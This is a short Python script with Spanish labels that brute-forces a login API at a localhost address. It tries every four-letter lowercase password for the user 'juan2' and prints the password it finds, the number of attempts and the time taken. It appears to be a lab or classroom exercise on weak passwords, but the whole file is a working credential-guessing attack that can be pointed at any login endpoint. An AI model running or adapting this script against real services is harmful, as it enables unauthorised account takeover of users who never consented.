import time
import requests

URL = "http://127.0.0.1:8000/login"
USERNAME = "juan2"
alphabet = "abcdefghijklmnopqrstuvwxyz"

def bruteforce_api(alp, username):
    inicio = time.time()
    intentos = 0

    with requests.Session() as session:
        for a in alp:
            for b in alp:
                for c in alp:
                    for d in alp:
                        intento = a + b + c + d
                        intentos += 1

                        try:
                            response = session.post(
                                URL,
                                json={"username": username, "password": intento},
                                timeout=5
                            )
                            data = response.json()
                        except requests.exceptions.RequestException as e:
                            print("Error de conexión con la API:", e)
                            return

                        if intentos % 500 == 0:
                            print(f"Intentos: {intentos} | Probando: {intento}")

                        if data.get("mensaje") == "Login exitoso":
                            fin = time.time()
                            print("\nCONTRASEÑA ENCONTRADA:", intento)
                            print("Intentos:", intentos)
                            print("Tiempo total:", fin - inicio, "segundos")
                            return

    fin = time.time()
    print("\nNo se encontró la contraseña")
    print("Intentos:", intentos)
    print("Tiempo total:", fin - inicio, "segundos")

if __name__ == "__main__":
    bruteforce_api(alphabet, USERNAME)